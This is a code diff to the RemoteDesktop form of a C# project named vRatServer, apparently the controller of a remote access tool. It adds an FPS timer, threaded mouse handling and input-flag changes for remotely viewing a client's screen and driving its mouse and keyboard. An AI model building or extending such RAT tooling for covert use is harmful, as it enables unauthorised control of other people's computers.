@@ -6,6 +6,7 @@ using System.Drawing;
 using System.Linq;
 using System.Text;
 using System.Threading;
+using System.Timers;
 using System.Windows.Forms;
 using vRatServer.Classes;
 
@@ -16,10 +17,20 @@ namespace vRatServer.Forms
         Client client;
         bool mouse = false;
         bool keyb = false;
+        public int fps = 0;
+        private static System.Timers.Timer timer;
+
+        private void TimerElapsed(object sender, ElapsedEventArgs e)
+        {
+            this.Text =  "RemoteDesktop  - " + client.Name+ "         FPS : " + fps.ToString();
+            fps = 0;
+        }
         public RemoteDesktop(Client client)
         {
             this.client = client;
             InitializeComponent();
+            timer = new System.Timers.Timer(1000); // 1000ms = 1 second
+            timer.Elapsed += TimerElapsed;
         }
 
         private void RemoteDesktop_Resize(object sender, EventArgs e)
@@ -38,6 +49,8 @@ namespace vRatServer.Forms
 
         private void RemoteDesktop_Load(object sender, EventArgs e)
         {
+            this.ActiveControl = null;
+            this.Text = this.Text + "  - " + client.Name;
             Showbtn.Location = new Point(400, 0);
             Showbtn.Left = (this.Width / 2) - (Showbtn.Width / 2);
             foreach (string sc in client.screens)
@@ -61,7 +74,7 @@ namespace vRatServer.Forms
 
         private void Startbtn_Click(object sender, EventArgs e)
         {
-            
+            timer.Start();
             byte[] mon = Encoding.Unicode.GetBytes(comboBox1.SelectedItem.ToString());
             byte[] data_buffer = mon.Concat(new byte[] { 0x00, 0x00 }).ToArray();
 
@@ -73,6 +86,8 @@ namespace vRatServer.Forms
 
         private void Stopbtn_Click(object sender, EventArgs e)
         {
+            timer.Stop();
+            this.Text = "RemoteDesktop  - " + client.Name + "         FPS : 0";
             byte[]? r = null;
             globals.SendPacket(client, (byte)globals.PacketType.rdpStop, 0, 0, ref r);
             Startbtn.Enabled = true;
@@ -85,7 +100,7 @@ namespace vRatServer.Forms
             panel1.Visible = true;
             Showbtn.Visible = false;
             Hidebtn.Visible = true;
-
+            pictureBox1.Focus();
 
         }
 
@@ -94,12 +109,53 @@ namespace vRatServer.Forms
             Hidebtn.Visible = false;
             Showbtn.Visible = true;
             panel1.Visible = false;
+            pictureBox1.Focus();
         }
 
         private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
         {
 
             if (!mouse) { return; }
+
+            //mousedown(sender, e);
+            ThreadPool.QueueUserWorkItem(_ => mousedown(sender, e));
+
+
+        }
+
+        private void MouseOnbtn_Click(object sender, EventArgs e)
+        {
+            mouse = true;
+            MouseOffbtn.Enabled = true;
+            MouseOnbtn.Enabled = false;
+            pictureBox1.Focus();
+        }
+
+        private void MouseOffbtn_Click(object sender, EventArgs e)
+        {
+            mouse = false;
+            MouseOffbtn.Enabled = false;
+            MouseOnbtn.Enabled = true;
+            pictureBox1.Focus();
+        }
+
+        private void keybOnbtn_Click(object sender, EventArgs e)
+        {
+            keyb = true;
+            keybOnbtn.Enabled = false;
+            keyboardOffbtn.Enabled = true;
+            pictureBox1.Focus();
+        }
+
+        private void keyboardOffbtn_Click(object sender, EventArgs e)
+        {
+            keyb = false;
+            keybOnbtn.Enabled = true;
+            keyboardOffbtn.Enabled = false;
+            pictureBox1.Focus();
+        }
+        void mousedown(object sender, MouseEventArgs e)
+        {
             int flag = 0x02;
             if (e.Button == System.Windows.Forms.MouseButtons.Right) { flag = 0x0008; }
             else if (e.Button == System.Windows.Forms.MouseButtons.Left) { flag = 0x0002; }
@@ -111,51 +167,20 @@ namespace vRatServer.Forms
 
             byte[] xposb = BitConverter.GetBytes(xpos);
             byte[] yposb = BitConverter.GetBytes(ypos);
-
+            flag = flag | 0x8000;
             byte[] d = BitConverter.GetBytes(flag);
 
 
-            
+
             byte[] concatenatedArray = xposb.Concat(yposb).Concat(d).ToArray();
 
 
-            
+
             globals.SendPacket(client, (byte)globals.PacketType.rdpMouse, 0xc, 0, ref concatenatedArray);
-
-
         }
 
-        private void MouseOnbtn_Click(object sender, EventArgs e)
+        void mouseup(object sender, MouseEventArgs e)
         {
-            mouse = true;
-            MouseOffbtn.Enabled = true;
-            MouseOnbtn.Enabled = false;
-        }
-
-        private void MouseOffbtn_Click(object sender, EventArgs e)
-        {
-            mouse = false;
-            MouseOffbtn.Enabled = false;
-            MouseOnbtn.Enabled = true;
-        }
-
-        private void keybOnbtn_Click(object sender, EventArgs e)
-        {
-            keyb = true;
-            keybOnbtn.Enabled = false;
-            keyboardOffbtn.Enabled = true;
-        }
-
-        private void keyboardOffbtn_Click(object sender, EventArgs e)
-        {
-            keyb = false;
-            keybOnbtn.Enabled = true;
-            keyboardOffbtn.Enabled = false;
-        }
-
-        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
-        {
-            if (!mouse) { return; }
             int flag = 0x02;
             if (e.Button == System.Windows.Forms.MouseButtons.Right) { flag = 0x0010; }
             else if (e.Button == System.Windows.Forms.MouseButtons.Left) { flag = 0x0004; }
@@ -167,7 +192,7 @@ namespace vRatServer.Forms
 
             byte[] xposb = BitConverter.GetBytes(xpos);
             byte[] yposb = BitConverter.GetBytes(ypos);
-
+            flag = flag | 0x8000;
             byte[] d = BitConverter.GetBytes(flag);
 
 
@@ -178,19 +203,23 @@ namespace vRatServer.Forms
 
             globals.SendPacket(client, (byte)globals.PacketType.rdpMouse, 0xc, 0, ref concatenatedArray);
         }
-
-        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
+        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
         {
-
-
             if (!mouse) { return; }
+            //mouseup(sender, e);
+            ThreadPool.QueueUserWorkItem(_ => mouseup(sender, e));
+
+        }
+
+        private void mouse_move(object sender,MouseEventArgs e)
+        {
             Point p = new Point(e.X * client.ScreenX / pictureBox1.Width, e.Y * client.ScreenY / pictureBox1.Height);
             int xpos = p.X;
             int ypos = p.Y;
             byte[] xposb = BitConverter.GetBytes(xpos);
             byte[] yposb = BitConverter.GetBytes(ypos);
 
-  
+
 
 
 
@@ -199,6 +228,14 @@ namespace vRatServer.Forms
 
 
             globals.SendPacket(client, (byte)globals.PacketType.rdpMouseHover, 8, 0, ref concatenatedArray);
+        }
+
+        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
+        {
+
+
+            if (!mouse) { return; }
+            ThreadPool.QueueUserWorkItem(_ => mouse_move(sender, e));
 
         }
 
@@ -234,6 +271,17 @@ namespace vRatServer.Forms
 
 
             globals.SendPacket(client, (byte)globals.PacketType.rdpKey, 8, 0, ref concatenatedArray);
+        }
+
+        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            pictureBox1.Focus();
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+            
+            
         }
     }
 }
